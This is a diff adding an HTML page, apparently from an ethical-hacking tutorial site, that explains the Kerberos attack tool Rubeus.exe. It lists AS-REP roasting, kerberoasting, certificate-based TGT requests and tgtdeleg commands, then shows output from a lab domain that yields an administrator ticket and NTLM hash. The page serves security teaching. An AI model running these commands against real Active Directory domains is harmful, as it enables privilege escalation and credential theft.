@@ -1,0 +1,79 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>Rubeus.exe</code>?</h1>
+    <p class="common"><code>Rubeus.exe</code> is a command-line tool developed to misuse and manipulate Kerberos authentication in Windows Active Directory environments. Its main purpose is to launch different attacks based on Kerberos, including ticket-grabbing, ticket-manipulation, and pass-the-ticket attacks. Rubeus offers an interface for using Kerberos functionality to elevate privileges, impersonate users, and gain unauthorized access to resources within a compromised Active Directory environment.</p>
+
+
+    <h1>Usage</h1>
+    <h2 class="blue">1. AS-REP Roating</h2>
+    <div class="code-box"><pre><code>PS C:\Tools> .\Robeus.exe asreproast /nowrap</code></pre></div>
+
+    <h2 class="blue">2. Kerberoasting</h2>
+    <div class="code-box"><pre><code>PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code></pre></div>
+
+    <h2 class="blue">3. Use pfx file to get NLTM hash (with certify.exe)</h2>
+    <div class="code-box"><pre><code>.\Rubeus.exe asktgt /user:administrator /certificate:C:\ProgramData\cert.pfx /show /nowrap</code></pre></div>
+    <ul>
+        <li>Requests a Kerberos TGT for <code>administrator</code> using certificate-based authentication (PKINIT) with the cert stored in <code>C:\ProgramData\cert.pfx</code>, and prints the result in a compact, no-wrapping format.</li>
+        <li><strong><code>asktgt</code></strong> : <br>Rubeus subcommand that asks the KDC for a TGT (Ticket Granting Ticket). Normally clients get a TGT by authenticating with a password (AS-REQ + AS-REP). With <code>asktgt</code> + certificate, Rubeus performs a PKINIT-based AS-REQ (certificate-based authentication).</li>
+        <li><strong><code>/show</code></strong> : <br>After the operation, Rubeus will show human-readable details about the ticket(s) obtained or the response from the KDC — e.g., success/failure, ticket info, encryption type, ticket blobs, etc.</li>
+        <li><strong><code>nowrap</code></strong> : <br>Format option that prevents Rubeus from wrapping long lines; useful when copying raw ticket data or when you need single-line outputs for scripting/parsing.</li>
+
+    </ul>
+    <h2 class="blue">4. Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:</h2>
+    <div class="code-box"><pre><code>.\rubeus.exe tgtdeleg /nowrap</code></pre></div>
+
+
+    <h1>Actual Output</h1>
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> <u>.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap</u>
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGT
+
+[*] Got domain: sequel.htb
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
+[*] Using domain controller: fe80::2d3a:9dae:eaf0:377d%4:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  administrator (NT_PRINCIPAL)
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  11/7/2025 10:54:20 AM
+  EndTime                  :  11/7/2025 8:54:20 PM
+  RenewTill                :  11/14/2025 10:54:20 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  /WZQhHtQFw01WVyFnuBayA==
+  ASREP (key)              :  A3BC8DAF14B7F41ED080F988E3AE78E0
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       <u>NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE</u></code></pre></div>
+</body>
+</html>
